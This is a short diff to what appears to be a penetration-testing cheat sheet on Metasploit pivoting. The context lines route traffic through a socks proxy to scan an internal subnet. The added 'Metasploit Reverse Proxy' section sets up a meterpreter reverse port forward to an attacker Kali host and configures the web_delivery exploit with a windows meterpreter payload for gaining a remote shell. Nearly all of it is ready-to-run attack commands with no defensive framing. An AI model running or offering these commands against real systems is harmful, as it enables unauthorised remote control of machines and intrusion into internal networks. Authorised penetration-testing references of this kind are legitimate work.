@@ -54,7 +54,12 @@ auxiliary/server/socks_proxy
 route add 172.16.100.0/24 1
 set SRVPORT 1080 # Modify proxychains.conf to use 127.0.0.1 on port 1080
 proxychains4 nmap -sT -Pn -v 172.16.100.100
-
-
 ```
-
+### Metasploit Reverse Proxy
+```
+portfwd add -R -p 1010 -l 8080 -L 192.168.1.91 #Kali 192.168.1.91 
+use exploit/multi/script/web_delivery
+set lhost 192.168.1.91
+set lport 8080
+set payload windows/x64/meterpreter/bind_tcp
+```
